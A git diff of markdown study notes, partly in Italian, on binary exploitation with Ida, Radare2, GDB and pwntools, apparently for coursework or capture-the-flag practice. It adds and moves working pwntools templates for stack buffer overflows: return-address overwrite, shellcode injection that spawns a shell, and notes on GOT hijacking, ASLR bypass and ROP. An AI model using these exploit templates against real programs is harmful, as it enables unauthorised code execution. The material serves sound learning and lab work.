@@ -39,7 +39,7 @@ Let's see some commands (available to use on terminal) that might be useful for 
 
 
 ## Ida
-### Basics 
+### Ida basics 
 To open Ida from terminal:
 ```
 cd idafree-8.1/
@@ -59,9 +59,11 @@ We can also patch instructions on Ida by changing the actual hexadecimal values.
 > ***PLEASE NOTE:*** The instructions are identified in hex with their opcode. So if you want to change an instruction you need to change the hex/opcode with the one you want. You can find all the opcodes with the corresponding instruction at: http://ref.x86asm.net/coder64.html 
 In particular, please note that the opcode for the NOP instruction is 90.
 
+This is the same as [Patching with Radare2](#Patching-with-Radare2)
+
 
 ## Radare2
-### Basics
+### Radare2 basics
 Radare2 is very useful for patching *(e.g. we can fill with NOP, invert or remove them and also paste new functions)*. In particular, we can use it for change some constant (since the free version of Ida doesn't really allow us to do so).
 
 Let's see some Radare commands (that we use on the terminal) that help us doing it:
@@ -87,7 +89,6 @@ Let's see some Radare commands (that we use on the terminal) that help us doing 
     afl     //which stands for Analyse Function List
     ```
 
-
 ### Patching with Radare2
 To patch the instruction (once you've moved to the corresponding memory address) you can use:
 ```C
@@ -103,7 +104,7 @@ This is the same as [Patching with Ida](#Patching-with-Ida)
 
 
 ## GDB (included PEDA)
-### Basics
+### GDB basics
 To run a file using GDB, i.e. debugging it:
 ```C
 gdb name_of_the_file
@@ -211,7 +212,7 @@ new_obj_name = process(path/name_of_the_process)
 
 Once we have written our python script we can run it from terminal by doing:
 ```
-python name_pf_the_script
+python name_of_the_script
 ```
 
 ### Sending and receiving data from processes
@@ -231,7 +232,7 @@ Now that we have a connection between the process and the python script we can u
     ```
 
 ### Packing
-To pack data *(e.g. from the address in hex 0x... to bytes)* pwntools uses the context global variable (by default little endian) to automatically calculate how the packing should work. This is possible thanks to the function:
+To pack data *(e.g. from the address in hex 0x... to bytes)* pwntools uses the *context* global variable (by default little endian) to automatically calculate how the packing should work. This is possible thanks to the function:
 ```python
 //if we compile in a 64-bit architecture
 packed_bytes = p64(data_to_pack)
@@ -253,7 +254,7 @@ p.interactive()
 
 ### ELF
 ELF is a class of pwntools that it's very useful because it allows use to retrieve some information from the ELF file (i.e. the executable in Linux) without having to use debuggers, disassembler etc...
-Whatever you need to do with this class, firstly we need  to create an elf object (which basiacally represent the program):
+Whatever you need to do with this class, firstly we need to create an elf object (which basiacally represent the program):
 ```python
 name_of_elf_object = ELF('path/name_of_the_program')
 ```
@@ -265,6 +266,29 @@ Some usefull stuff we can do is:
 
 
 
+
+
+> ***FOCUS: REDIRECT EXECUTION*** 
+> 
+> When a function calls another function, it:
+> - pushes a return pointer (EIP) to the stack so the called function knows where to return
+> - when the called function finishes execution, it pops it off the stack again
+> 
+> Because this value is saved on the stack, just like our local variables, if we write more characters than the program expects, we can overwrite the value and redirect code > > execution to wherever we wish.
+> To redirect the execution (i.e. changing where we return):
+> - first we need to find the padding until we begin to overwrite the return pointer (EIP)  -> use [cyclic patterns](Cyclic-patterns)
+> - then we need to find what value we want to overwrite EIP to (i.e. the address of the function we want to execute) -> use [ELF .symbols function](#ELF) or use [afl command in Radare2](#Radare2-basics)
+> 
+> Basically the code in python will loke like this:
+> ```python
+> from pwn import *            # import pwntools
+> p = process('./name_of_the_process')        # to interact with the process
+> payload = b'A' * n       # n is the number of bytes for the padding
+> payload += p32(address_to_go)   # pack the address of the function to execute
+> p.sendline(payload)
+> # if the function to execute is the opening of a shell then you need to add also:
+> # p.interactive()
+> ```
 
 
 
@@ -282,24 +306,11 @@ Some usefull stuff we can do is:
 > ```
 > Then you can search for the most suitable between the choices in the print (please make sure to look at the correct architecture and at the bytes needed for the shellcode).
 
-```
-from pwn import *
-
-context.binary = ELF('./vuln')
-
-p = process()
-
-payload = asm(shellcraft.sh())          # The shellcode
-payload = payload.ljust(312, b'A')      # Padding
-payload += p32(0xffffcfb4)              # Address of the Shellcode
-
-p.sendline(payload)
-
-p.interactive()
-```
 
 
 ```
+### Bypassing ASLR (Address Space Layout Randomisation)
+
 GOT thing that allows a c program to call libc libraries and sereve as a jumping point for the porgram (we can try to hijack it especially if aslr is enabled because there things stay constant). if we modify the jumping point we can make the program execute code at a different address than intended.
 to extract the got address (offset in the table) of a function (of the porgram) we can use radare2:
 in particular (after aaaa and r2 opening even without write mode), do a afl 
@@ -359,7 +370,7 @@ PIE is a precondition to enable address space layout randomization (ASLR). ASLR 
 ou can see where the GOT entry for a function is by running:
 objdump --dynamic-reloc ./name_of_the_file
 The address of the real function (or the rtl linking function) is directly
-at the printed address.
+at the printed address
 
 
 
@@ -417,8 +428,26 @@ then we pack it as io.pack(...) io.pacK(...) and then enjoy the shell
 
 
 
+
+
+```
+from pwn import *
+
+context.binary = ELF('./vuln')
+
+p = process()
+
+payload = asm(shellcraft.sh())          # The shellcode
+payload = payload.ljust(312, b'A')      # Padding
+payload += p32(0xffffcfb4)              # Address of the Shellcode
+
+p.sendline(payload)
+
+p.interactive()
 ```
 
+
+```
 ROP?? Vedi segnalibro + roba stack a parte 
 (secondo me metterei anche la robe della shell qui tipo)
 
@@ -426,15 +455,13 @@ ASM SMALL GUIDE ???
 
 La funzione gets() acquisisce una stringa da tastiera, fino alla fine, compresi eventuali spazi e il ritorno a capo che trasforma nel carattere terminatore (\0). La funzione puts() visualizza l'intera riga di testo, ad esempio una stringa inserita da tastiera, compreso il ritorno a capo
 
-GDB 
-python code included in gbd
- r < $(python -c "print('A'*50)")   /da come input il risultato dello script
  
  +PWNTOOLS DI TRINCAW
-  asm(shellcraft.sh())                                          /crea una shell 
+ asm(shellcraft.sh())                                          /crea una shell 
  offset = cyclic_find("kaaa")                                  /ritorna la distanza della stringa kaaa sul cyclic
  c.binary.got["exit"]                                          /ottiene l'indirizzo della funzione exit in got
  c.binary.functions["win"].address                             /ottiene l'indirizzo di un metodo all'interno del
+ 
  -ROP 
  dst = context.binary.get_section_by_name(".data").header.     /ottiene l'indirizzo di un area di memoria
  r(r14=dst, r15=b"flag.txt")                                   /scrive su i registri dati
